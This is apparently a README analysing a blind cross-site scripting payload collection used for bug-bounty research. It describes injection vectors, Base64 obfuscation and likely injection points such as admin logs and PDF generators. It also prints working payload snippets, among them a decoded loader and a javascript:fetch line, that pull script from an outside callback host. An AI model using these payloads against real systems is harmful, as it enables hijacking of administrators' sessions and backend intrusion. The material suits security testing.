# Blind XSS Analysis Report - GoogleVRP PoC

This repository contains a collection of payloads designed for Blind Cross-Site Scripting (XSS) research. These payloads are intended to be injected into fields that are later rendered in backend systems, administrative panels, or logging interfaces.

## 1. Payload Categorization

The payloads in the `test` file utilize several distinct execution vectors:

### A. Event-Based Attributes
Most payloads leverage common HTML event handlers to trigger execution upon rendering.
- **`onerror`**: Used primarily with `<img>` tags (`<img src=x onerror="...">`).
- **`onfocus`**: Used with `<input>` tags using the `autofocus` attribute to trigger without user interaction.
- **`onload`**: Used with `<body>` or `<svg>` tags.

### B. Protocol-Based Execution
Payloads using the `javascript:` pseudo-protocol are included, targeting `href` or `src` attributes.
- Example: `javascript:fetch('https://1.hackeronce.com/?p=js-protocol')`

### C. External Resource Fetching
Tags that naturally load external content are used to bypass simple filters.
- **`<iframe>`**: Used to load a tracking page.
- **`<script>`**: Used to load external JavaScript.
- **`<base>`**: Used to hijack relative URLs by setting a new base path.
- **`<meta>`**: Used for `refresh` redirects.

### D. Template Injection
The repository includes payloads for **AngularJS**, targeting expression evaluation in the client-side template engine.
- Example: `{{constructor.constructor("fetch('...')")()}}`

## 2. Obfuscation Techniques

Several payloads use **Base64 encoding** combined with `eval(atob(...))` to evade static analysis and string-based filtering.

### Decoded Payload Examples:
When decoded, the Base64 strings consistently reveal a pattern of dynamic script injection:
```javascript
const x=document.createElement('script');
x.src='https://1.hackeronce.com/?p=...';
document.body.appendChild(x);
```
This technique ensures that even if the initial injection is minimal, a more complex payload can be loaded from the callback server.

## 3. Callback Domain

The primary callback domain used across all payloads is **`1.hackeronce.com`**. Each payload is tagged with a unique identifier (e.g., `?p=img-onerror` or `?vector=V01`) to allow the researcher to correlate the callback with the successful injection vector.

## 4. High-Value Injection Points

The repository identifies several strategic locations for Blind XSS testing:
- **Feedback and Contact Forms**: Often rendered in internal support dashboards.
- **Analytic Parameters**: `utm_` parameters, `ref` parameters, and tracking headers (e.g., `Referer`).
- **Administrative Logs**: Headers that are often logged, such as `User-Agent` or `X-Forwarded-For`.
- **Document Generators**: Systems that generate PDFs (invoices, receipts) from HTML input.

## Conclusion
This repository serves as a highly specialized toolkit for Blind XSS detection, focusing on reliable callback mechanisms and varied execution vectors to ensure coverage across different rendering environments.
